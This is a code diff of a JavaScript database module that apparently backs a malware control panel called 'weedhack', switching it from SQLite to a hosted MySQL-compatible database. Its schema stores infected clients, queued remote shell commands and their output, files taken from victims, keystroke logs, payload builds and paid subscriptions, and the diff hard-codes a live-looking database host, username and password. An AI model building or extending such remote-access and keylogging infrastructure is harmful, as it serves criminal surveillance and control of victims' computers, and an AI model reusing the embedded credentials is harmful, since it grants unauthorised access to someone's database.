@@ -1,136 +1,111 @@
 // language: JavaScript, file: db.js
-import { DatabaseSync } from 'node:sqlite';
+import mysql from 'mysql2/promise';
 import fs from 'node:fs';
 import path from 'node:path';
 import 'dotenv/config';
 
-export const DB_PATH   = process.env.DB_PATH   || './data/weedhack.db';
 export const UPLOAD_DIR = process.env.UPLOAD_DIR || './data/uploads';
 
 function ensureDir(p, mode = 0o700) {
   if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true, mode });
 }
 
-ensureDir(path.dirname(DB_PATH));
 ensureDir(UPLOAD_DIR);
 
-const db = new DatabaseSync(DB_PATH);
-db.exec('PRAGMA journal_mode = WAL');
-db.exec('PRAGMA foreign_keys = ON');
-db.exec('PRAGMA trusted_schema = OFF');
-db.exec('PRAGMA synchronous = NORMAL');
-
-// 1. Create tables
-db.exec(`
-  CREATE TABLE IF NOT EXISTS users (
-    id            INTEGER PRIMARY KEY AUTOINCREMENT,
-    username      TEXT UNIQUE NOT NULL,
-    email         TEXT UNIQUE NOT NULL,
-    password_hash TEXT NOT NULL,
-    account_key   TEXT UNIQUE NOT NULL,
-    login_token   TEXT UNIQUE,
-    discord_webhook TEXT NOT NULL,
-    created_at    INTEGER NOT NULL,
-    premium_until INTEGER DEFAULT 0
-  );
-
-  CREATE TABLE IF NOT EXISTS clients (
-    id         INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id    INTEGER NOT NULL,
-    key        TEXT NOT NULL,
-    hostname   TEXT NOT NULL,
-    ip         TEXT,
-    last_seen  INTEGER NOT NULL,
-    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
-  );
-
-  CREATE TABLE IF NOT EXISTS commands (
-    id         INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id    INTEGER NOT NULL,
-    client_id  INTEGER NOT NULL,
-    shell      TEXT NOT NULL,
-    line       TEXT NOT NULL,
-    output     TEXT,
-    status     TEXT NOT NULL DEFAULT 'pending',
-    created_at INTEGER NOT NULL,
-    FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
-    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-  );
-
-  CREATE TABLE IF NOT EXISTS uploads (
-    id          INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id     INTEGER NOT NULL,
-    client_id   INTEGER NOT NULL,
-    filename    TEXT NOT NULL,
-    stored_name TEXT UNIQUE NOT NULL,
-    size        INTEGER NOT NULL,
-    created_at  INTEGER NOT NULL,
-    FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
-    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-  );
-
-  CREATE TABLE IF NOT EXISTS keylogs (
-    id         INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id    INTEGER NOT NULL,
-    client_id  INTEGER NOT NULL,
-    data       TEXT NOT NULL,
-    created_at INTEGER NOT NULL,
-    FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
-    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-  );
-
-  CREATE TABLE IF NOT EXISTS builds (
-    id          INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id     INTEGER NOT NULL,
-    name        TEXT NOT NULL,
-    stored_name TEXT UNIQUE NOT NULL,
-    size        INTEGER NOT NULL,
-    base        TEXT NOT NULL,
-    key         TEXT NOT NULL,
-    config      TEXT NOT NULL,
-    created_at  INTEGER NOT NULL,
-    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
-  );
-`);
-
-// 2. Migrate old databases
-try {
-  const cols = db.prepare(`PRAGMA table_info(users)`).all();
-  
-  if (!cols.some(c => c.name === 'login_token')) {
-    db.exec(`ALTER TABLE users ADD COLUMN login_token TEXT`);
-    console.log('[db] migrated: added login_token column');
+// TiDB Config
+const DB_CONFIG = {
+  host: 'gateway01.eu-central-1.prod.aws.tidbcloud.com',
+  port: 4000,
+  user: '4Dosrowwv3DgbU6.root',
+  password: 'HuXBzVJiMf8Sz4YL',
+  database: 'sys',
+  waitForConnections: true,
+  connectionLimit: 20,
+  queueLimit: 0,
+  ssl: {
+    minVersion: 'TLSv1.2',
+    rejectUnauthorized: true
   }
-  
-  if (!cols.some(c => c.name === 'premium_until')) {
-    db.exec(`ALTER TABLE users ADD COLUMN premium_until INTEGER DEFAULT 0`);
-    // Migrate old premium=1 to a far future date so they don't lose access
-    if (cols.some(c => c.name === 'premium')) {
-      db.exec(`UPDATE users SET premium_until = 4102444800000 WHERE premium = 1`);
-      console.log('[db] migrated: converted premium flag to premium_until');
-    } else {
-      console.log('[db] migrated: added premium_until column');
-    }
-  }
-} catch (e) {
-  console.error('[db] migration:', e.message);
+};
+
+// Load CA if on Linux (TiDB requires SSL)
+if (fs.existsSync('/etc/ssl/certs/ca-certificates.crt')) {
+    DB_CONFIG.ssl.ca = fs.readFileSync('/etc/ssl/certs/ca-certificates.crt');
 }
 
-// 3. Create indexes
-db.exec(`
-  CREATE INDEX IF NOT EXISTS idx_users_key   ON users(account_key);
-  CREATE INDEX IF NOT EXISTS idx_users_login ON users(login_token);
-  CREATE INDEX IF NOT EXISTS idx_clients_user ON clients(user_id);
-  CREATE INDEX IF NOT EXISTS idx_clients_host ON clients(user_id, hostname);
-  CREATE INDEX IF NOT EXISTS idx_cmd_client ON commands(client_id, status);
-  CREATE INDEX IF NOT EXISTS idx_cmd_user   ON commands(user_id, created_at);
-  CREATE INDEX IF NOT EXISTS idx_uploads_client ON uploads(client_id, created_at);
-  CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at);
-  CREATE INDEX IF NOT EXISTS idx_builds_user ON builds(user_id, created_at);
-`);
+export const pool = mysql.createPool(DB_CONFIG);
 
-for (const f of [DB_PATH, DB_PATH + '-wal', DB_PATH + '-shm']) {
-  if (fs.existsSync(f)) { try { fs.chmodSync(f, 0o600); } catch {} }
+export async function initDb() {
+  const tables = [
+    `CREATE TABLE IF NOT EXISTS users (
+      id            BIGINT PRIMARY KEY AUTO_INCREMENT,
+      username      VARCHAR(255) UNIQUE NOT NULL,
+      email         VARCHAR(255) UNIQUE NOT NULL,
+      password_hash TEXT NOT NULL,
+      account_key   VARCHAR(255) UNIQUE NOT NULL,
+      login_token   VARCHAR(255) UNIQUE,
+      discord_webhook TEXT NOT NULL,
+      created_at    BIGINT NOT NULL,
+      premium_until BIGINT DEFAULT 0
+    );`,
+    `CREATE TABLE IF NOT EXISTS clients (
+      id         BIGINT PRIMARY KEY AUTO_INCREMENT,
+      user_id    BIGINT NOT NULL,
+      \`key\`      VARCHAR(255) NOT NULL,
+      hostname   VARCHAR(255) NOT NULL,
+      ip         VARCHAR(255),
+      last_seen  BIGINT NOT NULL,
+      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+    );`,
+    `CREATE TABLE IF NOT EXISTS commands (
+      id         BIGINT PRIMARY KEY AUTO_INCREMENT,
+      user_id    BIGINT NOT NULL,
+      client_id  BIGINT NOT NULL,
+      shell      VARCHAR(255) NOT NULL,
+      line       TEXT NOT NULL,
+      output     LONGTEXT,
+      status     VARCHAR(255) NOT NULL DEFAULT 'pending',
+      created_at BIGINT NOT NULL,
+      FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
+      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
+    );`,
+    `CREATE TABLE IF NOT EXISTS uploads (
+      id          BIGINT PRIMARY KEY AUTO_INCREMENT,
+      user_id     BIGINT NOT NULL,
+      client_id   BIGINT NOT NULL,
+      filename    VARCHAR(255) NOT NULL,
+      stored_name VARCHAR(255) UNIQUE NOT NULL,
+      size        BIGINT NOT NULL,
+      created_at  BIGINT NOT NULL,
+      FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
+      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
+    );`,
+    `CREATE TABLE IF NOT EXISTS keylogs (
+      id         BIGINT PRIMARY KEY AUTO_INCREMENT,
+      user_id    BIGINT NOT NULL,
+      client_id  BIGINT NOT NULL,
+      data       TEXT NOT NULL,
+      created_at BIGINT NOT NULL,
+      FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
+      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
+    );`,
+    `CREATE TABLE IF NOT EXISTS builds (
+      id          BIGINT PRIMARY KEY AUTO_INCREMENT,
+      user_id     BIGINT NOT NULL,
+      name        VARCHAR(255) NOT NULL,
+      stored_name VARCHAR(255) UNIQUE NOT NULL,
+      size        BIGINT NOT NULL,
+      base        VARCHAR(255) NOT NULL,
+      \`key\`       VARCHAR(255) NOT NULL,
+      config      TEXT NOT NULL,
+      created_at  BIGINT NOT NULL,
+      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+    );`
+  ];
+
+  for (const q of tables) {
+    await pool.query(q);
+  }
 }
 
-export default db;
+export default pool;
